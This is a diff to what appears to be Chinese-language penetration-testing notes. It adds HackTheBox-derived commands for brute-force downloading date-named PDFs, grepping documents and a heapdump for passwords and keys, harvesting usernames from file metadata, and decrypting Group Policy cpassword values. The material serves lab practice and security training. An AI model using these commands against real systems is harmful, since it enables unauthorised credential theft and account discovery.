@@ -155,6 +155,27 @@ curl http://target/actuator/heapdump -o heap.bin
 strings heap.bin | grep -iE "(password|secret|jdbc|jwt|redis|aws)" | sort -u
 ```
 
+### 4.2b 文档与文件情报提取（AD/靶场向补充，来源：HTB-Intelligence/Search/PivotAPI/Acute/Monteverde）
+
+```bash
+# PDF 双通道（发现一个日期命名 PDF → 全集爆破；HTB-Intelligence）
+for m in $(seq -w 1 12); do for d in $(seq -w 1 31);do f="2020-$m-$d-upload.pdf"; code=$(curl -s -o "$f" -w '%{http_code}' "http://target/documents/$f"); if [ "$code" = "200" ]; then echo "[+] $f";else rm -f "$f";fi;done;done
+for f in *.pdf; do pdftotext "$f" "${f%.pdf}.txt" 2>/dev/null; done   # 文本通道
+grep -inE 'password|pass|default|initial|temp|credential|login' *.txt
+for f in *.pdf; do pdfinfo "$f" 2>/dev/null | grep -i '^Creator:'; done | sed 's/^Creator:[[:space:]]*//' | sort -u   # 元数据通道：Creator=Windows 用户名清单
+
+# xlsx 本质是 zip：解压读 sharedStrings（xxe.md 的 xlsx-zip 是注入视角，此处是提取视角）
+unzip Phishing_Attempt.xlsx -d extracted && cat extracted/xl/sharedStrings.xml
+
+# 通用元数据
+exiftool New_Starter_CheckList_v7.docx    # Creator=真实姓名 / Description=主机名 / Last Modified By=用户名
+exiftool *.pdf                             # FTP/共享文件批扫（HTB-PivotAPI）
+
+# 图片放大审查（人眼活：截图便签、后台界面；HTB-Search 实测 slide_2.jpg 放大便签）
+```
+
+**GPP（Group Policy Preferences）**：SMB 匿名共享里发现 `Groups.xml`（SYSVOL 副本）→ `cpassword` 字段（AES，微软公开密钥可解）→ `gpp-decrypt <密文>` 得明文——完整链见 `references/notes/ad-initial-access.md` §1.4。
+
 ### 4.3 Bypass 矩阵 `[本地 src-hunter §4]`
 
 | 拦截 | 绕过 |
